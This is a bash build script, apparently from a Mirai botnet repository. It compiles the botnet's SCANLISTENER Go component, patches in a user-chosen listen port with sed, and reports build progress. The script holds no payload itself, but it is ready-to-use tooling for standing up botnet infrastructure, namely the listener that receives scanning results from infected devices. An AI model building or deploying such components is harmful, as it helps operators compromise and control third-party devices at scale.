#!/bin/bash
set -e

# =======================================
# build.sh
# Build SCANLISTENER binary from Mirai-Botnet/SCANLISTENER/src/ folder
# Usage: ./build.sh [port]
# =======================================

## Check if terminal supports colors
if command -v tput >/dev/null 2>&1 && [ -t 1 ]; then
    RED="$(tput setaf 1)"
    GREEN="$(tput setaf 2)"
    YELLOW="$(tput setaf 3)"
    BLUE="$(tput setaf 4)"
    CYAN="$(tput setaf 6)"
    BOLD="$(tput bold)"
    RESET="$(tput sgr0)"
else
    RED=""
    GREEN=""
    YELLOW=""
    BLUE=""
    MAGENTA=""
    CYAN=""
    BOLD=""
    RESET=""
fi

# Detect the script directory
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

function print_help {
    echo -e "${CYAN}==================== HELP ====================${RESET}"
    echo -e "${BOLD}Usage:${RESET} $0 [port]"
    echo
    echo "Builds the SCANLISTENER binary from the src/ folder."
    echo
    echo -e "${BOLD}Arguments:${RESET}"
    echo -e "  ${YELLOW}port${RESET}       TCP port to listen on (default: 48101)"
    echo
    echo -e "${BOLD}Examples:${RESET}"
    echo "  $0"
    echo "  $0 8080"
    echo "  $0 9001"
    echo -e "${CYAN}==============================================${RESET}"
}

function print_error {
    echo -e "${RED}[!] $1${RESET}"
    exit 1
}

# Show help if requested
if [[ "$1" == "-h" || "$1" == "--help" ]]; then
    print_help
    exit 0
fi

# Default port if no argument is passed
LISTEN_PORT="${1:-48101}"

# Validate port number
if ! [[ "$LISTEN_PORT" =~ ^[0-9]+$ ]] || [ "$LISTEN_PORT" -lt 12500 ] || [ "$LISTEN_PORT" -gt 65535 ]; then
    echo -e "${RED}==================== ERROR ====================${RESET}"
    echo
    echo -e "${RED}Error:${RESET} Invalid port number '$LISTEN_PORT'"
    echo -e "Port must be a number between 12500 and 65535."
    echo
    print_help
    exit 1
fi

# Set output directory
OUTDIR="$SCRIPT_DIR/bins"

# Delete old release files
rm -rf "$OUTDIR"

echo -e "${BLUE}==================== BUILD START ====================${RESET}"
echo -e "${CYAN}[*] Building SCANLISTENER...${RESET}"
echo -e "${CYAN}[*] Using listen port:${RESET} ${YELLOW}$LISTEN_PORT${RESET}"
mkdir -p "$OUTDIR"

echo -e "${BLUE}==================== SOURCE PREPARATION ====================${RESET}"

# Create a temporary copy of the source file with modified port
TEMP_SRC="$OUTDIR/scanListen_temp.go"
echo -e "${CYAN}[*] Preparing source with port ${YELLOW}$LISTEN_PORT${RESET}${CYAN}...${RESET}"
cp "$SCRIPT_DIR/src/scanListen.go" "$TEMP_SRC"

# Replace the hardcoded port with the specified port
sed -i "s/0.0.0.0:48101/0.0.0.0:$LISTEN_PORT/g" "$TEMP_SRC"

echo -e "${GREEN}[+]${RESET} Source prepared with listen port ${GREEN}$LISTEN_PORT${RESET}"

echo -e "${BLUE}==================== COMPILATION ====================${RESET}"

# Build the binary using the simple command
echo -e "${CYAN}[*] Running go build...${RESET}"
if ! go build -o "$OUTDIR/scanListener" "$TEMP_SRC"; then
    echo "${RED}==================== BUILD FAILED ===================="
    echo "Error: SCANLISTENER binary could not be built. Check the output above for details."
    echo -e "======================= ERROR ========================${RESET}"
    exit 1
fi
echo -e "${GREEN}[+]${RESET} SCANLISTENER binary built at ${GREEN}$OUTDIR/scanListener${RESET}"

# Clean up temporary file
rm -f "$TEMP_SRC"

echo -e "${CYAN}[*] Binary details:${RESET}"
echo -e "    Listen port: ${YELLOW}$LISTEN_PORT${RESET}"
echo -e "    Output file: ${GREEN}$OUTDIR/scanListener${RESET}"
echo

echo -e "${YELLOW}==================== BUILD COMPLETE ====================${RESET}"
echo -e "${GREEN}[*] Build completed successfully.${RESET}"
echo -e "${GREEN}[*]${RESET} SCANLISTENER binary is ready in ${GREEN}$OUTDIR${RESET}"
echo -e "${CYAN}[*] To run: ${YELLOW}$OUTDIR/scanListener${RESET}"
echo -e "${YELLOW}========================================================${RESET}"

# Exit with success
exit 0